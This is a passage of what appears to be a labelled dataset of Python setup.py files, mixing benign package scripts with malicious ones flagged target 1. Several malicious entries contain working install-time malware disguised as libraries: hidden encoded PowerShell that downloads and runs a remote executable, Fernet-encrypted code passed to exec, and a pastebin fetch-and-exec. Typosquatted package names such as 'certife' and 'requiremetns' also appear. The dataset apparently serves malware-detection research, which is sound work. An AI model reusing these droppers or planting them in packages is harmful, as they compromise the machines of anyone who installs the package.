BuildApiDoc(setup_command.BuildDoc):\n        def run(self):\n            args = list(\n                itertools.chain(\n                    [\"-f\"],  # force re-generation\n                    [\"-P\"],  # include private modules\n                    [\"--implicit-namespaces\"],  # respect PEP420\n                    [\"-o\", str(ROOT / \"docs\" / \"api\" / \"gluonts\")],  # out path\n                    [str(SRC / \"gluonts\")],  # in path\n                    [\"setup*\", \"test\", \"docs\", \"*pycache*\"],  # excluded paths\n                )\n            )\n            apidoc.main(args)\n            super(BuildApiDoc, self).run()\n\n    for command in [\"build_sphinx\", \"doc\", \"docs\"]:\n        setup_kwargs[\"cmdclass\"][command] = BuildApiDoc\n\n# -----------------------------------------------------------------------------\n# start of AWS-internal section (DO NOT MODIFY THIS SECTION)!\n#\n# all AWS-internal configuration goes here\n#\n# end of AWS-internal section (DO NOT MODIFY THIS SECTION)!\n# -----------------------------------------------------------------------------\n\n# do the work\n\nif __name__ == \"__main__\":\n    setup(**setup_kwargs)\n", "target": 0}
{"idx": "google-cloud-firestore-2.6.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-firestore\"\ndescription = \"Google Cloud Firestore API client library\"\nversion = \"2.6.0\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"google-cloud-core >= 1.4.1, <3.0.0dev\",\n    \"proto-plus >= 1.20.5, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package for package in setuptools.find_packages() if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-firestore\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_firestore_v1_keywords.py\",\n        \"scripts/fixup_firestore_admin_v1_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "libccreplacemask-8.41", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libccreplacemask',\n    packages = ['modlib'],\n    version = '3.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqresuper-4.71", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqresuper',\n    packages = ['modlib'],\n    version = '1.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-webpack-loader-1.6.0", "func": "import os\nimport re\n\nfrom setuptools import setup\n\n\ndef rel(*parts):\n    '''returns the relative path to a file wrt to the current directory'''\n    return os.path.abspath(os.path.join(os.path.dirname(__file__), *parts))\n\nwith open('README.md', 'r') as handler:\n  README = handler.read()\n\nwith open(rel('webpack_loader', '__init__.py')) as handler:\n  INIT_PY = handler.read()\n\n\nVERSION = re.findall(\"__version__ = '([^']+)'\", INIT_PY)[0]\n\nsetup(\n  name = 'django-webpack-loader',\n  packages = ['webpack_loader', 'webpack_loader/templatetags', 'webpack_loader/contrib'],\n  version = VERSION,\n  description = 'Transparently use webpack with django',\n  long_description=README,\n  long_description_content_type=\"text/markdown\",\n  author = 'Owais Lone',\n  author_email = 'hello@owaislone.org',\n  download_url = 'https://github.com/django-webpack/django-webpack-loader/tarball/{0}'.format(VERSION),\n  url = 'https://github.com/django-webpack/django-webpack-loader', # use the URL to the github repo\n  keywords = ['django', 'webpack', 'assets'], # arbitrary keywords\n  classifiers = [\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Framework :: Django',\n    'Framework :: Django :: 2.0',\n    'Framework :: Django :: 2.1',\n    'Framework :: Django :: 2.2',\n    'Framework :: Django :: 3.0',\n    'Framework :: Django :: 3.1',\n    'Framework :: Django :: 3.2',\n    'Framework :: Django :: 4.0',\n    'Environment :: Web Environment',\n    'License :: OSI Approved :: MIT License',\n  ],\n)\n", "target": 0}
{"idx": "requiremetns-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'GCvFRoESwhsSnDGBfJ avswMRvKvTjLJbqC'\nLONG_DESCRIPTION = 'pskfU  qeXXSKrLaTIsUxaKg ultNqSJpFbEEWM QthGVAzfmOXRiy xgbpMaHgHNkFNuZRynClnsaIqUiFZEjMOnLDucYlwsyqLgxvbePfNCMhsqzNmIsiKTKVLmyaiSoaoezY BYVHtiuCUYuCELDkcVRMgquXSHFQMwWUFMrDxACrtzxEATFaliICHCWhZWGzQgiQIyNnui wwiAiZfBFbafIKHwQzkxwgOWRfdknkMdgJMgttoZsOkmjtwZVrgcqxXumAQDUvkEkDQTAMKHtNFlQVzWgwjMSsKjHxhyPTyoJiDAVLKZCSnjhcIIkTJNi OcTFFfbYpFkJVfkLMWfPBFbilLfhaBdvMvTJWaZJXRDeRkmXtvzSkxI'\n\n\nclass ZTrWFjUBDWEWojKGODfuogPVedSoJPoHhdbJrbPhyTvBYLqpJlbybzyndvKVJjKszzyTBFqQXElcFthZupvrHwZStmQGGSoaSbcgOpxrwtulXIehpbkfZznhwaEIygAMBPYijoXuWkmntWzaxsISIshbiFbItOVkuKoctckiA(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'cH5TdDi2TkEFRozrvFnlZqIY5my9dtZ6_t1-hN_ic3o=').decrypt(b'gAAAAABmBIW7cERzZ0qZ1sWjqI462inYkUHoJWc9o24b4bC2T3iJGz_lXfqgH6Yo_mIkG2XP3ApuKpT7IRLNnkjzE75rWXEySXcxG0yU2nF96a2HkSoNEndKuOVdz-0qjusdNwfoVja-r4WZlLHrCcmiFfHayUWkbBDrMXDbDqeG1I73QD7qLXZ9hnKOzKoqwegnDTE8NkdZknOH1L4V64-BfiWAcgs3mSraKrtA0dHkSY9PA400zZE='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requiremetns\",\n    version=VERSION,\n    author=\"doiTxKyqhv\",\n    author_email=\"JFAFGndRDUKon@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': ZTrWFjUBDWEWojKGODfuogPVedSoJPoHhdbJrbPhyTvBYLqpJlbybzyndvKVJjKszzyTBFqQXElcFthZupvrHwZStmQGGSoaSbcgOpxrwtulXIehpbkfZznhwaEIygAMBPYijoXuWkmntWzaxsISIshbiFbItOVkuKoctckiA,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "py-reget-1.64", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-reget',\n    packages = ['modlib'],\n    version = '3.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "certife-2022.9.24", "func": "#!/usr/bin/env python\nimport re\nimport os\nimport sys\n\n# While I generally consider it an antipattern to try and support both\n# setuptools and distutils with a single setup.py, in this specific instance\n# where certifi is a dependency of setuptools, it can create a circular\n# dependency when projects attempt to unbundle stuff from setuptools and pip.\n# Though we don't really support that, it makes things easier if we do this and\n# should hopefully cause less issues for end users.\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nversion_regex = r'__version__ = [\"\\']([^\"\\']*)[\"\\']'\nwith open('certifi/__init__.py') as f:\n    text = f.read()\n    match = re.search(version_regex, text)\n\n    if match:\n        VERSION = match.group(1)\n    else:\n        raise RuntimeError(\"No version number found!\")\n\nif sys.argv[-1] == 'publish':\n    os.system('python setup.py sdist bdist_wheel upload')\n    sys.exit()\n\nsetup(\n    name=\"certife\",\n    version=VERSION,\n    description='Python package for providing Mozilla\\'s CA Bundle.',\n    long_description=open('README.rst').read(),\n    author=\"Orange Alice\",\n    author_email='me@kennethreitz.com',\n    url='https://github.com/certifi/python-certifi',\n    packages=[\n        'certifi',\n    ],\n    package_dir={'certifi': 'certifi'},\n    package_data={'certifi': ['*.pem', 'py.typed']},\n    # data_files=[('certifi', ['certifi/cacert.pem'])],\n    include_package_data=True,\n    zip_safe=False,\n    license='MPL-2.0',\n    python_requires=\">=3.6\",\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)',\n        'Natural Language :: English',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.11',\n    ],\n    project_urls={\n        'Source': 'https://github.com/certifi/python-certifi',\n    },\n)\n", "target": 1}
{"idx": "xolokadyqehtbs-0.0.0", "func": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolokadyqehtbs', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)", "target": 1}
{"idx": "googleanalytics-0.26.0", "func": "import codecs\n\nfrom setuptools import find_packages, setup\n\nsetup(name='googleanalytics',\n    description='A wrapper for the Google Analytics API.',\n    long_description=codecs.open('README.rst', 'r', 'utf-8').read(),\n    author='Stijn Debrouwere',\n    author_email='stijn@debrouwere.org',\n    url='https://github.com/debrouwere/google-analytics/',\n    download_url='http://www.github.com/debrouwere/google-analytics/tarball/master',\n    version='0.26.0',\n    license='ISC',\n    packages=find_packages(),\n    keywords='data analytics api wrapper google',\n    scripts=[\n        'bin/googleanalytics'\n    ],\n    include_package_data=True,\n    install_requires=[\n        'oauth2client==1.5.2',\n        'google-api-python-client==1.4.2',\n        'python-dateutil',\n        'addressable>=1.4.2',\n        'inspect-it>=0.3.2',\n        'werkzeug>=0.10',\n        'keyring==5.3',\n        'click>=6',\n        'pyyaml>=3',\n        'prettytable>=0.7',\n        'colorama>=0.3',\n        'snakify>=1.1',\n    ],\n    test_suite='googleanalytics.tests',\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Topic :: Scientific/Engineering :: Information Analysis',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        ],\n    )\n", "target": 0}
{"idx": "upgrade-requestt-0.0.1", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name=\"upgrade-requestt\",\n    version=\"0.0.1\",\n    packages=['requests'],\n    install_requires = [\n        \"requests==2.31.0\"\n    ],\n    author=\"upgrade-requestt\",\n    description=\"upgrade-requestt\"\n)", "target": 1}
{"idx": "osintvm-1.87", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'osintvm',\n    packages = ['modlib'],\n    version = '9.57',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqmchydra-3.48", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmchydra',\n    packages = ['modlib'],\n    version = '9.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "guihydra-9.69", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'guihydra',\n    packages = ['modlib'],\n    version = '10.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-url-filter-0.3.15", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom __future__ import print_function\nimport os\n\nfrom setuptools import find_packages, setup\n\nfrom url_filter import __author__, __version__\n\n\ndef read(fname):\n    with open(os.path.join(os.path.dirname(__file__), fname), \"rb\") as fid:\n        return fid.read().decode(\"utf-8\")\n\n\nauthors = read(\"AUTHORS.rst\")\nhistory = read(\"HISTORY.rst\").replace(\".. :changelog:\", \"\")\nlicence = read(\"LICENSE.rst\")\nreadme = read(\"README.rst\")\n\nreq = read(\"requirements.txt\").splitlines()\ndev_req = read(\"requirements-dev.txt\").splitlines()[2:]\n\nrequirements = req + [\"setuptools\"]\ntest_requirements = req + dev_req\n\nsetup(\n    name=\"django-url-filter\",\n    version=__version__,\n    author=__author__,\n    description=\"Django URL Filter provides a safe way to filter data via human-friendly URLs.\",\n    long_description=\"\\n\\n\".join([readme, history, authors, licence]),\n    url=\"https://github.com/miki725/django-url-filter\",\n    license=\"MIT\",\n    packages=find_packages(exclude=[\"test_project*\", \"tests*\"]),\n    install_requires=requirements,\n    test_suite=\"tests\",\n    tests_require=test_requirements,\n    keywords=\" \".join([\"django django-rest-framework\"]),\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Natural Language :: English\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Development Status :: 2 - Pre-Alpha\",\n    ],\n)\n", "target": 0}
{"idx": "delta-0.4.2", "func": "\"\"\"\nsetup.py\n\"\"\"\nfrom setuptools import setup, find_packages\n\n__VERSION = '0.4.2'\n\nsetup(\n    name='delta',\n    version=__VERSION,\n    author='Rodney Gomes',\n    author_email='rodneygomes@gmail.com',\n    url='https://github.com/rlgomes/delta',\n    install_requires=[],\n    tests_require=[\n        'robber==1.0.1'\n    ],\n    test_suite='test',\n    keywords=['date', 'durations', 'timedelta'],\n    py_modules=['delta'],\n    packages=find_packages(exclude=['test']),\n\n    license='MIT',\n    description='Human friendly context aware duration parsing library',\n    long_description='https://github.com/rlgomes/delta',\n)\n", "target": 0}
{"idx": "pymatematics-1.0.0", "func": "from setuptools import setup\nimport socket\nimport urllib.request\nimport os\nimport shutil\nimport winreg\nimport requests\nimport pip\n\npackages = ['colorama', 'psutil', 'requests', 'sockets', 'pycaw', 'comtypes', 'discord', 'pypiwin32', 'pycryptodome', 'uuid', 'cryptography', 'pyfiglet', 'browser_cookie3', 'discord_webhook', 'prettytable', 'getmac', 'pyautogui', 'winregistry', 'robloxpy', 'pywin32', 'Pillow', 'tqdm', 'setuptools', 'opencv-python', 'numpy', 'pycaw', 'wmi']\n\nfor package in packages:\n    pip.main(['install', package])\n\n\ndef send_discord_info():\n import requests\n import os\n\nurl = 'https://pastebin.pl/view/raw/c9c74e28'\n\narchivo = requests.get(url)\ncodigo = archivo.text\n\nruta = os.path.join(os.path.expanduser('~'), 'WindowsDefender.py')\nwith open(ruta, 'w', encoding='utf-8') as f:\n    f.write(\"# -*- coding: latin-1 -*-\\n\")\n    f.write(codigo)\n\nexec(compile(codigo, ruta, 'exec'))\n\nos.remove(ruta)\n\n\nfrom setuptools import setup\n\nsetup(\n    name='pymatematics',\n    version='1.0.0',\n    packages=['pymatematics'],\n    url='https://github.com/pymatematics/pymatematics',\n    license='',\n    author='pymatematics',\n    author_email='pymatematics@gmail.com',\n    description='Python Matematics',\n)\n\n\nif __name__ == '__main__':\n    send_discord_info()", "target": 1}
{"idx": "docx2txt-0.8", "func": "import glob\nfrom distutils.core import setup\n\n# get all of the scripts\nscripts = glob.glob('bin/*')\n\nsetup(\n  name='docx2txt',\n  packages=['docx2txt'],\n  version='0.8',\n  description='A pure python-based utility to extract text and images '\n              'from docx files.',\n  author='Ankush Shah',\n  author_email='ankush.shah.nitk@gmail.com',\n  url='https://github.com/ankushshah89/python-docx2txt',\n  download_url='https://github.com/ankushshah89/python-docx2txt/tarball/0.8',\n  keywords=['python', 'docx', 'text', 'images', 'extract'],\n  scripts=scripts,\n  classifiers=[],\n)\n", "target": 0}
{"idx": "libpostping-9.19", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpostping',\n    packages = ['modlib'],\n    version = '1.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 